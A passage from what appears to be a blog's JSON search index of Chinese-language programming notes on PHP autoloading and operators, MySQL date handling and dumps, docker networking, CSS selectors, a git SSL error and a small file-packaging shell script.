::](http://jonas1011.pixnet.net/blog/post/24303632-%5Bphp%5Drequire-%E5%92%8C-include)\n- [PHP Sandbox, test PHP online, PHP tester](http://sandbox.onlinephpfunctions.com/)\n- [Composer 進階原理：PHP 命名空間與 PSR-0 | 轉個彎日誌](http://blog.turn.tw/?p=1122) {% asset_link web2.png 備份圖 %}\n- [Composer 設計原理與基本用法 | 轉個彎日誌](http://blog.turn.tw/?p=1039) {% asset_link web3.png 備份圖 %}\n- [php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork](http://jsnwork.kiiuo.com/archives/2437/php-composer-json-%E8%A8%AD%E5%AE%9A-classmap-%E6%8C%87%E5%AE%9A%E8%87%AA%E5%8B%95%E8%AE%80%E5%8F%96%E7%9A%84%E6%AA%94%E6%A1%88%E6%88%96%E8%B7%AF%E5%BE%91/)\n- [composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国](https://my.oschina.net/sallency/blog/893518)\n- [php – Compoer – 非常簡單的使用 psr-4 來建立自動讀取類別 | jsnWork](http://jsnwork.kiiuo.com/archives/2618/php-compoer-%E9%9D%9E%E5%B8%B8%E7%B0%A1%E5%96%AE%E7%9A%84%E4%BD%BF%E7%94%A8-psr-4-%E4%BE%86%E5%BB%BA%E7%AB%8B%E8%87%AA%E5%8B%95%E8%AE%80%E5%8F%96%E9%A1%9E%E5%88%A5/)\n- [php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork](http://jsnwork.kiiuo.com/archives/2437/php-composer-json-%e8%a8%ad%e5%ae%9a-classmap-%e6%8c%87%e5%ae%9a%e8%87%aa%e5%8b%95%e8%ae%80%e5%8f%96%e7%9a%84%e6%aa%94%e6%a1%88%e6%88%96%e8%b7%af%e5%be%91/)\n- [psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否](https://segmentfault.com/a/1190000006686978)\n- [php - What Are the Differences Between PSR-0 and PSR-4? - Stack Overflow](https://stackoverflow.com/questions/24868586/what-are-the-differences-between-psr-0-and-psr-4)\n- [PSR-0/PSR-4 命名标准 · php 笔记 · 看云](https://www.kancloud.cn/xiak/php-node/191121)\n- [PHP PSR-4 与 PSR-0 规范 - zHHHe 的专栏 - CSDN 博客](https://blog.csdn.net/sky_zhe/article/details/38615615)\n- [php 的 use 明顯比 require 高端大氣上檔次 - 開源中國](https://www.oschina.net/question/123890_135938?sort=default&p=2)\n- [php 使用命名空间:导入导出之疑问 - 开源中国](https://www.oschina.net/question/147332_138188)\n- [深入 Composer autoload | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区](https://laravel-china.org/topics/1002/deep-composer-autoload)\n- [如何使用 Namespace? | 點燈坊](https://oomusou.io/php/php-namespace/)\n- [PHP Tutorial: Getting Started with Composer | Codementor](https://www.codementor.io/jadjoubran/php-tutorial-getting-started-with-composer-8sbn6fb6t)\n","tags":["autoload"],"categories":["PHP"]},{"title":"mysql字串自動轉數字小記","url":"%2Fblog%2F2019%2F01%2F17%2Fmysql%E5%AD%97%E4%B8%B2%E8%87%AA%E5%8B%95%E8%BD%89%E6%95%B8%E5%AD%97%E5%B0%8F%E8%A8%98%2F","content":"\n最近用 MySQL 做時間比較\n想做`datetime欄位(0000-00-00 00:00:00) > ''`\n結果得出來結果是`0`\n\n<!--more-->\n\n之前知道 SQL 沒有 boolean\n不過在做時間比較\n發現很奇怪\n怎麼跟空字串比較結果為`0`\n\n<!--more-->\n\nGoogle 一下\n發現原來 MySQL 會做自動轉型\n\n`0 = ''`為`1`\n原來空字串會自動轉成`0`\n所以才會得出這個結果\n這個不常做，感覺很容易忘記\n\n2019-06-10\n\n最近發現 null 時候，做 where 條件(大於、小於)不會抓到\n但是 0000-00-00 可以\n所以這是為什麼大家都會這樣用?!\n但這樣做 add_date 時候就會有問題\n有優點也有缺點\n\n參考來源：\n\n- [mysql: why comparing a 'string' to 0 gives true? - Stack Overflow](https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true)\n- [MySQL :: MySQL 8.0 Reference Manual :: 12.3.2 Comparison Functions and Operators](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html#operator_equal)\n- [type conversion - MySQL automatically cast/convert a string to a number? - Stack Overflow](https://stackoverflow.com/questions/21762075/mysql-automatically-cast-convert-a-string-to-a-number)\n- [MySQL :: MySQL 5.7 Reference Manual :: 12.2 Type Conversion in Expression Evaluation](https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html)\n"},{"title":"git出現「curl: (60) SSL certificate problem: unable to get local issuer certificate」錯誤","url":"%2Fblog%2F2019%2F01%2F12%2Fgit%E5%87%BA%E7%8F%BE%E3%80%8Ccurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E3%80%8D%E9%8C%AF%E8%AA%A4%2F","content":"\n今天發生怪事\n公司內網 gitlab 網址 ip 換成網域導致 socuretree 跟 git bash 不能用\n後來再找解決的方法\n\n<!--more-->\n\n##解決方法\n\n### git remote 改成 ssh 網址\n\n走 ssh 方式就能順利解決 git 連線的問題\n\n### 改 curl.cainfo(此方法跟這個沒關係)\n\n```\n    php.ini 中的 openssl.cafile 設定\n    php.ini 中的 curl.cainfo 設定\n    php.ini 中的 /usr/local/etc/openssl/cert.pem 設定 (Homebrew provided)\n```\n\n我發現用瀏覽器網頁都正常，但是在 curl 上面就不正常...\n但我這個是 gitlab...，所以跟 php 沒有什麼關係\n[labs.beyond.com.tw » Yosemite 上 Guzzle 遇到的 openssl certificate 問題](http://labs.beyond.com.tw/blog/?p=685)\n\n### 憑證看起來沒辦法用在內網上面\n\n瀏覽器網頁都正常，但是在 curl 上面就不正常...，我還不確定能不能這樣用\n不過看到下面這篇\n[SSL 证书是不是不能绑定 192.168.1.1 这类本地地址？ - 梅林 - KoolShare - 源于玩家 服务玩家](http://koolshare.cn/thread-64823-1-1.html)\n\n其他參考來源：\n[使用 plesk ssh chrooted 遇到 git clone https SSL 問題 | SSORC.tw](https://ssorc.tw/6440)\n[蚊子館: Lighttpd - HTTPS(SSL)](http://linux-guys.blogspot.com/2010/12/lighttpd-httpsssl.html)\n[用 curl 和 wget 略過 SSL 憑證 - 筆記 | Mr. 沙先生](https://shazi.info/%E7%94%A8-curl-%E5%92%8C-wget-%E7%95%A5%E9%81%8E-ssl-%E6%86%91%E8%AD%89-%E7%AD%86%E8%A8%98/)\n[curl: (60) SSL certificate problem: unable to get local issuer certificate 错误 - 不忘初心，方得始终 - CSDN 博客](https://blog.csdn.net/sanbingyutuoniao123/article/details/71124655)\n[sourcetree 的远程创库验证名字出错，但是记住名字。如何修改？ - 知乎](https://www.zhihu.com/question/28654385)\n[git 如何避開 SSL 憑證問題 | 老洪的 IT 學習系統](https://snippetinfo.net/media/1973)\n[通过 SourceTree 连接 SSL 有问题的自建 gitlab 服务器 - fishmai 的专栏 - CSDN 博客](https://blog.csdn.net/fishmai/article/details/76400931)\n"},{"title":"Mysql記錄時間的那些事情","url":"%2Fblog%2F2019%2F01%2F10%2FMysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85%2F","content":"\n常時間我們都會記錄時間\n很常大家都會使用`datetime`來記錄\n有時候大家也很喜歡使用`unixtime`來做時間記錄\n到底 DB 有沒有記錄什麼`時間`方法\n這篇只是小記\n\n<!--more-->\n\n由於我現在公司使用 unixtime 型別存在資料庫是`int`\n今天用 phpmyadmin 操作設定 ts 欄位(int10)做 default value 動做 `CURRENT_TIMESTAMP`\n竟然不能 work!!!!\n哪尼我要做 default 不能做\n後來看到[MySQL Timestamp 型態 的 屬性(新增/修改 自動更新 Timestamp 型態 的 欄位) | Tsung's Blog](https://blog.longwin.com.tw/2007/10/mysql_timestamp_properties_2007/)\n他是用 timestamp...，~~等等 timestamp 不是 int 嗎...~~\n不過我看了一下 phpmyadmin 顯示是時間的日期\n這邊我們先來看官方文件怎麼說?\n\n## 官方文件\n\n### String and Numeric Literals in Date and Time Context.\n\nMySQL recognizes DATE values in these formats:\n\n> - As a string in either 'YYYY-MM-DD' or 'YY-MM-DD' format. A “relaxed” syntax is permitted: Any punctuation character may be used as the delimiter between date parts. For example, '2012-12-31', '2012/12/31', '2012^12^31', and '2012@12@31' are equivalent.\n> - As a string with no delimiters in either 'YYYYMMDD' or 'YYMMDD' format, provided that the string makes sense as a date. For example, '20070523' and '070523' are interpreted as '2007-05-23', but '071332' is illegal (it has nonsensical month and day parts) and becomes '0000-00-00'.\n> - As a number in either YYYYMMDD or YYMMDD format, provided that the number makes sense as a date. For example, 19830905 and 830905 are interpreted as '1983-09-05'.\n\n簡單來說 MySQL 來看時間'2018-12-12','20181212','2018@12@12' MySQL 都看得懂\n'181212'他也會自動轉成'2018-12-12'\n非字串數字也能轉成時間\n\n好吧大多數來講這樣寫，可能會被公司長輩打頭(逃~~)\n\n### MySQL recognizes DATETIME and TIMESTAMP values in these formats:\n\nMySQL recognizes DATETIME and TIMESTAMP values in these formats:\n\n> - As a string in either 'YYYY-MM-DD HH:MM:SS' or 'YY-MM-DD HH:MM:SS' format. A “relaxed” syntax is permitted here, too: Any punctuation character may be used as the delimiter between date parts or time parts. For example, '2012-12-31 11:30:45', '2012^12^31 11+30+45', '2012/12/31 11*30*45', and '2012@12@31 11^30^45' are equivalent.\n> - The only delimiter recognized between a date and time part and a fractional seconds part is the decimal point.\n> - The date and time parts can be separated by T rather than a space. For example, '2012-12-31 11:30:45' '2012-12-31T11:30:45' are equivalent.\n> - As a string with no delimiters in either 'YYYYMMDDHHMMSS' or 'YYMMDDHHMMSS' format, provided that the string makes sense as a date. For example, '20070523091528' and '070523091528' are interpreted as '2007-05-23 09:15:28', but '071122129015' is illegal (it has a nonsensical minute part) and becomes '0000-00-00 00:00:00'.\n> - As a number in either YYYYMMDDHHMMSS or YYMMDDHHMMSS format, provided that the number makes sense as a date. For example, 19830905132800 and 830905132800 are interpreted as '1983-09-05 13:28:00'.\n\n簡單來說他跟上面點都差不多，第二點在說`date`跟`time`需要用一個符號區分開(矇逼，我沒看文件還真的不知道...)\n不知道動手玩看看就知道\n\n```sql\nselect unix_timestamp('2012@12@31');\nselect unix_timestamp('2012-12-31');\nselect unix_timestamp('20121231');\nselect unix_timestamp('20021231');\nselect unix_timestamp('021231');\n\nselect unix_timestamp('2012@12@31 010101');\nselect unix_timestamp('2012-12-31G010101');\n```\n\nPS: 兩位數轉換官方文件也有寫清楚\n\n```\n    Year values in the range 70-99 are converted to 1970-1999.\n\n    Year values in the range 00-69 are converted to 2000-2069.\n```\n\n官方文件\n\n- [MySQL :: MySQL 8.0 Reference Manual :: 11.3.1 The DATE, DATETIME, and TIMESTAMP Types](https://dev.mysql.com/doc/refman/8.0/en/datetime.html)\n- [MySQL :: MySQL 8.0 Reference Manual :: 9.1.3 Date and Time Literals](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-literals.html)\n\n更詳細的 datetime 跟 timestamp 差別請看[MySQL 案例之 Timestamp 和 Datetime - Rangle - 博客园](https://www.cnblogs.com/rangle/p/8275302.html) {% asset_link web1.png 備份圖 %}\n\n我過去看過型別\n\n- datetime\n- timestamp\n- int\n- varchar\n\nint 是現在公司用的\nvarchar 事前一間公司用的，聽說很舊系統都這樣用，聽說好移轉 XD\n\n## 使用 unixtime 要注意的大小事 - 時區問題\n\n如裡面有做備份說明[MySQL 案例之 Timestamp 和 Datetime - Rangle - 博客园](https://www.cnblogs.com/rangle/p/8275302.html)\n\n不過我看一些紀錄都不建議用 timestamp 做紀錄\n詳細如下\n\n- [timezone - How do I get the current time zone of MySQL? - Stack Overflow](https://stackoverflow.com/questions/2934258/how-do-i-get-the-current-time-zone-of-mysql)\n- [Mysql 的問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10186779)\n- [MySQL 的时区是否应该设置为 UTC？ - 代码日志](https://codeday.me/bug/20170619/28746.html)\n- [如何在 MySQL 中存储 datetime 与时区信息 - 代码日志](https://codeday.me/bug/20171201/103722.html)\n- [sql-我应该在 MySQL 中使用 datetime 还是 timestamp 数据类型？——CSDN 问答频道](https://ask.csdn.net/questions/711972)\n\n推估應該要以程式端為主控制(?!，目前自己猜測的...)\n\n先記錄到這邊\n\n題外話\n想起之前想寫一篇 timezone format 筆記\n但都沒有抽出時間寫`2014-12-01T12:00:00Z`\n[[ Alex 宅幹嘛 ] 👨‍💻moment.js 日期時間管理資源庫入門導讀 - YouTube](https://www.youtube.com/watch?v=DDu78WvmpB0)\n有時間來時做一個來玩玩看\n另外瀏覽器的時間格式是`2118-01-01`\n剛好發現...html 的 input type 屬性`datetime`屬性廢棄掉了\n[<input type=\"datetime\"> | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/datetime)\n[<input type=\"datetime-local\"> | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/datetime-local)\n他的格式是`2018-06-12T19:30`\n前端最近流行這個格式???\n","tags":["mysql"],"categories":["MySQL"]},{"title":"顯示一個資料夾全部檔案路徑","url":"%2Fblog%2F2019%2F01%2F09%2F%E9%A1%AF%E7%A4%BA%E4%B8%80%E5%80%8B%E8%B3%87%E6%96%99%E5%A4%BE%E5%85%A8%E9%83%A8%E6%AA%94%E6%A1%88%E8%B7%AF%E5%BE%91%2F","content":"\n最近要抓一個資料夾所有檔案路徑\n在想有什麼方法可以一次快速搞定?\n所以我想一個笨方法\n就是新增 git\n\n```bash\ngit add *\ngit status\n```\n\n在複製所有路徑到編輯器再做修改\n覺得還是有更快的方案\n\n<!--more-->\n\n後來有在網路上爬到一個發法\n在想要的目錄下面開啟 cmd(git bash.exe)\n執行`find .`\n會印出所有當下目錄檔案路徑\n\n```bash\nfind . > filepath.txt\n```\n\n可快速建立出來所有東西\n\n要切出 file 名稱\n可以在 sublime Text 做正規化`[^/]+.php`\n收工 XDD\n","tags":["linux"],"categories":["程式心法"]},{"title":"CSS猛猛的煙火特效蒐集","url":"%2Fblog%2F2019%2F01%2F08%2FCSS%E7%8C%9B%E7%8C%9B%E7%9A%84%E7%85%99%E7%81%AB%E7%89%B9%E6%95%88%E8%92%90%E9%9B%86%2F","content":"\n最近看到很猛的煙火特效\n[An Anonymous Pen on CodePen](https://codepen.io/anon/pen/BvVbOw)\n[HTML5 canvas and javascript fireworks tutorial](https://codepen.io/whqet/pen/Auzch)\n[jquery 實現煙花特效](http://www.jq22.com/jquery-info14173)\n\n其他小記\n[有利于 SEO 的 div+css 命名全面小结*烟火*新浪博客](http://blog.sina.com.cn/s/blog_6b2fcbbc0101d9mi.html)\n","tags":["css"],"categories":["網頁特效"]},{"title":"CSS Selector做空白可能要注意的事情","url":"%2Fblog%2F2019%2F01%2F08%2FSelector%E5%81%9A%E7%A9%BA%E7%99%BD%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n最近 jQuery 使用`.siblings(':first-child + ~ ');`\n感覺哪裡怪怪的\n前陣子我踩了`div :hover`地雷(我心中所想的是`div:hover`)\n結果差很多...\n太少寫 CSS 犯了低級的錯誤....\n但我今天看到這個`.siblings(':first-child + ~');`怎麼可以跑.....\n\n<!--more-->\n\n其實我猜測在做`~+`的時候前後空白會被忽略\n因為之前不小心寫`div :hover`\n我覺得正常前後不要空白比較好\n\n雖然我還沒看到相關文件有說前後可以空白\n不過自己實驗`~+`前後空白不會有這個問題\n\n最後無聊提醒[[CSS] 不常用的 CSS Selectors 筆記 | 程式狂想筆記](https://malagege.github.io/blog/2017/04/29/logdown/2017-04-29-1767277/)\njQuery 的 siblings 跟 CSS 的`~`是不一樣的\njQuery 的 siblings 是除了自己本身 selector 同階層都會抓到\n但是 CSS`xxx~`是 xxx 後面屬性都會抓到\n\n`element1+`跟`element1~`都可以跑\n好奇怪為什麼這樣還是可以跑\n目前猜測後面沒寫`element1+`，會自動帶`*`\n所以跟結果`element1+*`一樣\n不過我還是沒有找到文章\n日後看到會再補充\n\n最後我自己又重新看 code 一次\n`.siblings(':first-child + ~');`\n其實我這個寫法可以這樣寫`.siblings(':first-child~');`\n甚至可以用 jQuery`not`function 使用\n`.siblings().not(:first-child);`\n我很少用複查的寫法\n\n這個 js 用途是用在做多列 table，點擊一個按鈕，需要把其他列資料隱藏起來\n所以才用這個方法\n但我最近發現 table 結構\n\n```html\n<table>\n  <thead>\n    <tr>\n      <th>標題</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>test</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n其實這樣編排的話不需要做這麼複雜的事情\n我可以對 tbody 做比較不需要寫複雜的 code\n**不過說真的 thead 跟 tbody 沒寫的時候**\n瀏覽器其實會幫你建立的\n這通常自己會忘記(已經踩好幾次了 orz)\n","tags":["css"],"categories":["CSS"]},{"title":"window做ssh有辦法做到256顏色方法","url":"%2Fblog%2F2019%2F01%2F07%2Fwindow%E5%81%9Assh%E6%9C%89%E8%BE%A6%E6%B3%95%E5%81%9A%E5%88%B0256%E9%A1%8F%E8%89%B2%E6%96%B9%E6%B3%95%2F","content":"\n最近打算把筆電 elementary os 帶去公司開發\n主要想把 docker 環境帶過去\n但是我電腦設定 zsh\n原本想共用電腦切換\n但卡在滑鼠鍵盤不能共用\n所以有找一些方法\n\n- USB 切換器 OR KVM (價格也不便宜)\n- USB 拷貝線(價格不便宜，但只能用在 Window 上面...)\n- [键盘鼠标共享效率工具-Synergy - 简书](https://www.jianshu.com/p/9fd09bb9f694)\n\n原本最後想用 Synergy\n但是我又不想使用...網路\n最後看到有人說 Linux 還需要遠端嗎? ssh 就好 XDD\n我覺得好像有道理\n但是一般 pietty 進去 zsh 沒有 256 顏色真的醜到爆...\n所以找了一些方法\n\n<!--more-->\n\n網路一堆教 putty 方法，但我測試都不能用...\n所以決定放棄\n\n[Help with 256 color support on Windows · Issue #1968 · zeit/hyper](https://github.com/zeit/hyper/issues/1968)\n原本看到這篇有安裝 hyper\n但沒成功支援 256 色\n~~工程師壓力大...看 cmd 黑白會 coding 越會黑白，舒適好看 command 才看得爽~~\n但下面有人提到[Terminus](https://eugeny.github.io/terminus/)\n立馬下載免安裝\n[Release Alpha 68 · Eugeny/terminus](https://github.com/Eugeny/terminus/releases/tag/v1.0.68)\n設定字型`hack`\nwindows 可正常跑出顏色!!!\n雖然有些還不是很完美(下面不知道為什麼會多一行)\n但至少顏色都出來\n\n{% asset_img 1.jpg %}\n\n其他參考來源:\n\n- [USB 对拷线设置教程](http://www.lulian.cn/news/277-cn.html)\n- [win10 下的 VSCode 用 cmder 作默认的命令终端(shell) - 简书](https://www.jianshu.com/p/c3b162df3b57)\n- [PowerShell 美化：oh my posh | Flymia 凡事用心之事](https://ppundsh.github.io/posts/ad6e/)\n- [Oh My ZSH! with PuTTY » mordsgau.de Blog](https://blog.mordsgau.de/oh-my-zsh-with-putty/)\n- [How do you do remote access? : elementaryos](https://www.reddit.com/r/elementaryos/comments/62ifss/how_do_you_do_remote_access/)\n- [判断终端色彩支持情况的方法 | 高明飞的博客](http://gaomf.cn/2017/01/16/Terminal_Color/)\n- [键盘鼠标共享效率工具-Synergy - 简书](https://www.jianshu.com/p/9fd09bb9f694)\n- [Chocolatey Gallery | synergy (Install) 1.7.5](https://chocolatey.org/packages/synergy)\n","tags":["ssh"],"categories":["實用工具"]},{"title":"docker嘗試著把兩個不同network container做連線動作","url":"%2Fblog%2F2019%2F01%2F06%2Fdocker%E5%98%97%E8%A9%A6%E8%91%97%E6%8A%8A%E5%85%A9%E5%80%8B%E4%B8%8D%E5%90%8Cnetwork-container%E5%81%9A%E9%80%A3%E7%B7%9A%E5%8B%95%E4%BD%9C%2F","content":"\n之前讀到 load balance 都沒有看到如何做 DB 處理\n不可能各區域都有一個 DB 吧\n不過之前有跟人聊過\n在部屬程式的時候，做 load balance 在每一個分流 IP 設定可以設一樣東西\n不過內部 DB 要怎麼共用呢? 不過聽說可以設定讓他們導向一樣的地方\n講那麼多有點離題，因為這篇也不是做 load balance\n\ndocker 在不同專案 說不定也會用到共用 DB\n今天是自己實驗小記\n可能不會記錄很詳細\n畢竟 docker network 我還是很不熟\n\n<!--more-->\n\n今天找了相關 docker network 東西\n但還不是很了解，有找了幾篇文章\n\n- [Docker 学习与实践 - 网络篇 - Waterstrong](https://blog.waterstrong.me/docker-networking/)\n- [Docker 進階實務班](https://www.slideshare.net/philipzh/docker-78924025)\n- [放棄思考: Docker Network 及 Docker Compose 教學](https://javatoybox.blogspot.com/2018/10/docker-network-docker-compose.html)\n\n首先，我實作兩個 network 出來\n想辦法讓他們的 container 可以相連\n\n```\ndocker network create test_1\ndocker network create test_2\ndocker run --name some-mysql1 -e MYSQL_ROOT_PASSWORD=root -d --network=test_1 mysql --default-authentication-plugin=mysql_native_password\ndocker run --name some-mysql2 -e MYSQL_ROOT_PASSWORD=root -d --network=test_2 mysql --default-authentication-plugin=mysql_native_password\ndocker run --name adminer --network=test_1 -d -p  8080:8080 adminer\ndocker network connect test_2 adminer\n```\n\n主要最後重點\ndocker network connect `network_name` `container_name`\n可以讓你的 container 連線\n\n奇怪，docker run --network 只能塞一個 network_name\n好像只透過 docker connect 才能做連結\n不過 docker-compose 好像能設定兩個 network\n感覺 docker network 也是一個大坑洞\n之後有時間研究在筆記一下\n\n之前聽到 k8s 可以做到 docker 監控，順便做重啟動作\n剛好最近看到這個影片有介紹\n[COSS 103 kubernetes 介紹 教學 指令操作 - YouTube](https://www.youtube.com/watch?v=wnKyJKqKiVE)\n感覺還滿好用的東西\n有空來研究看看\n不過我覺得 docker 先搞熟再說\n\n## MySQL 8.0 的雷\n\n想說嘗試著用 docker 跑 mysql\nadminer 一直登不進去\n後來仔細看了一下 docker hub 的 pwd 有多`--default-authentication-plugin=mysql_native_password`\nWTF...\n\n> 因為 之前 MySQL 預設儲存密碼的方式是 mysql_native_password, 但 8.0 之後 預設的儲存方式為 caching_sha2_password, 說是又快又安全啦, 但讓人措手不及, 一堆 SQL 工具 (Navicat) 可能還來不及更新支援 就...\n\nORZ...\n\n[MySQL8 Authentication plugin Change « Sam 的程式筆記](http://samchu.logdown.com/posts/7425945-mysql8-authentication-plugin-change)\n[PHP: Requirements - Manual](http://php.net/manual/en/mysqli.requirements.php)\n","tags":["docker"],"categories":["Docker"]},{"title":"mysqldump可能會失敗原因小記","url":"%2Fblog%2F2019%2F01%2F05%2Fmysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98%2F","content":"\n最近出現有 mysqldump 備份失敗問題\n但也不知道是什麼原因導至失敗\n不過這邊蒐集一些資訊\n\n<!--more-->\n\n## 蒐集相關資料\n\n蒐集一些資訊\n\n- [mysqldump：常用操作、案例分享、意外终止的原因以及解决方法 - 记录创业路上的一些想法 - CSDN 博客](https://blog.csdn.net/dba_waterbin/article/details/8810339)\n- [MySQL 线程处于 Waiting for table flush 的分析 - 潇湘隐者 - 博客园](http://www.cnblogs.com/kerrycode/p/7388968.html)\n- [Get locked tables in mysql query - Stack Overflow](https://stackoverflow.com/questions/3230693/get-locked-tables-in-mysql-query)\n- [MySQL 线程处于 Waiting for table flush 的分析 - 潇湘隐者 - 博客园](http://www.cnblogs.com/kerrycode/p/7388968.html)\n- [mysql lock tables - 無執 - ITeye 博客](https://lhdst-163-com.iteye.com/blog/2117083)\n- [[MySQL 案例]之备份与 Waiting for table flush | HiDBA | 林晓嘉](http://myrock.github.io/2014/11/20/mysql-waiting-for-table-flush/)\n- [MySQL 的 SQL_CALC_FOUND_ROWS - 简书](https://www.jianshu.com/p/d676b763c747)\n\n## 簡單小記\n\n首先有看到 processlist 有一個`Waiting for table flush`\n目前猜測可能是做 mysqldump 的時候，做 select 查詢可能會卡住\n詳細原因還不清楚\n\n### 備份 MySQL 方法\n\n- [rsync 備份 | Tsung's Blog](https://blog.longwin.com.tw/2005/12/rsync_ssh_backup/)\n- [在 Linux 上，關於 Mysql 備份，什麼方式最好呢？ tar 方式好久！ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10091279)\n\n感覺 rsync 指令好像滿好用的，改天來學一下如何用\n","tags":["mysqldump"],"categories":["MySQL"]},{"title":"快速打包程式的腳本(shell)","url":"%2Fblog%2F2019%2F01%2F05%2F%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell%2F","content":"\n最近公司做一個專案需要手動打包程式\n因為目前公司測試環境只有一個\n所以那個專案放在我們公司某一個 GIT 裡面\n所以很難做到用`git archive`打包動作...\n\n<!--more-->\n\n最近因為很急著上 code\n卻不小心包錯(手動複製到別的資料夾)...\n~~人會犯錯是應該的~~\n但同一個錯誤應該是要避免的\n所以我寫了這個 shell\nproject_path 前面路徑請注意要更改\npack_path 前面路徑看是否需要調整\nwindow 請使用 git bash 執行，直接點兩下好像不能跑\n\n```sh\n## 快速打包程式\n# project_path 前面路徑請注意要更改\n# pack_path 前面路徑看是否需要調整\n# window請使用git bash執行，直接點兩下好像不能跑\nproject_path=/d/GIT/專案名稱/\npack_path=/d/pack/`date +%Y%m%d`/專案名稱/\necho project_path\necho $project_path\necho pack_path\necho $pack_path\nrm -rf $pack_path\nmkdir -p $pack_path\n\nfilelist=(\n#請放置相對程式路徑\napplication/controllers/*.php\napplication/controllers/A/ABC.php\n)\n\n\nfor file in ${filelist[@]};do\nmkdir -p `dirname $pack_path$file`\ndir=(`dirname $pack_path$file`)\n# echo cp $project_path$file ${dir[0]}\ncp -f $project_path$file ${dir[0]}\ndone\n```\n\n其實我也不太會寫 shell\n這個只是簡單的應用\n我只 Google 一下 shell 怎麼寫 Array 跟抓檔案目前資料夾路徑(dirname)\n在簡單用 mkdir, cp 就做出來這個東西\n從此打包程式不手殘\n","tags":["打包程式"],"categories":["shell"]},{"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","url":"%2Fblog%2F2019%2F01%2F05%2FPHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5%2F","content":"\n最近發現 PHP 有兩個運算子`?:`和`??`\n這兩個看起來用途很像\n但我覺得一定有什麼不一樣的地方\n這邊就簡單記錄他們的差別\n\n<!--more-->\n\n## ?:\n\n首先，先介紹這個符號，有些別的程式語言也可以用這個\n他有專門中文名稱叫「三元運算子」\n我還有一篇看他他叫貓王運算子?!!!\n原來是`?:`反過來看很像貓王 XDD\n詳細：[貓王運算子 - Elvis Operator - Qiita](https://qiita.com/vc7/items/5519b3721377362d7c1d)\n\n官方文件敘述[PHP: 比较运算符 - Manual - 三元運算符 ](http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary)\n\n> 表達式 (expr1) ? (expr2) : (expr3) 在 expr1 求值為 TRUE 時的值為 expr2，在 expr1 求值為 FALSE 時的值為 expr3。\n> 自 PHP 5.3 起，可以省略三元運算符中間那部分。表達式 expr1 ?: expr3 在 expr1 求值為 TRUE 時返回 expr1，否則返回 expr3。\n\n## ??\n\n這個是我同事跟我說 PHP7.0 才可以支援使用\n簡單看了一下介紹，感覺跟`?:`很像\n但是不知道差別在哪\n其實官方文件伈得很清楚[PHP: 新特性 - Manual - null 合併運算符](http://php.net/manual/zh/migration70.new-features.php#migration70.new-features.null-coalesce-op)\n\n> 由於日常使用中存在大量同時使用三元表達式和 isset()的情況， 我們添加了 null 合併運算符 (??) 這個語法糖。如果變量存在且值不為 NULL， 它就會返回自身的值，否則返回它的第二個操作\n\n```php\n<?php\n// Fetches the value of $_GET['user'] and returns 'nobody'\n// if it does not exist.\n$username = $_GET['user'] ?? 'nobody';\n// This is equivalent to:\n$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';\n\n// Coalesces can be chained: this will return the first\n// defined value out of $_GET['user'], $_POST['user'], and\n// 'nobody'.\n$username = $_GET['user'] ?? $_POST['user'] ?? 'nobody';\n?>\n```\n\n這樣來看，在`??`使用上會比`?:`來的方便，但缺點是只有在 PHP7.0 專案才能使用\n\n## 簡單總結\n\n其實，這兩個都非常接近，`??`在沒有宣告的時候不會發生錯誤，`?:`會發生錯誤。\n但這兩個就算了解，不常使用下也很容易忘記跟部習慣...\n我後來發現這種跟[mysql COALESCE 取代 null 值好方法 | 程式狂想筆記](https://malagege.github.io/blog/2018/07/19/mysql-COALESCE-%E5%8F%96%E4%BB%A3null%E5%80%BC%E5%A5%BD%E6%96%B9%E6%B3%95/)有點像\n當`??`為 null 時候就用後面的變數`??`，這個跟`COALESCE`有異曲同工之妙\n所以用 SQL 這個觀念來記真的比較輕鬆\n\n## 簡單實測紀錄\n\n{% asset_img 1.jpg  %}\n{% asset_img 2.jpg  %}\n","tags":["php"],"categories":["PHP"]},{"title":"Regex 豎旗(flag)的那些事情","url":"%2Fblog%2F2019%2F01%2F02%2FRegex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85%2F","content":"\n很常去搞正規化\n但卻沒有認真了解裡面的事情\n今天一口氣記錄\n其實仔細看也沒很多(= =a)\n\n<!--more-->\n\nflag\n\n- g Global search.\n- i Case-insensitive search.\n- m Multi-line search.\n- u unicode; treat a pattern as a sequence of unicode code points\n- y Perform a \"sticky\" search that matches starting at the current position in the target string. See [RegExp.prototype.sticky | 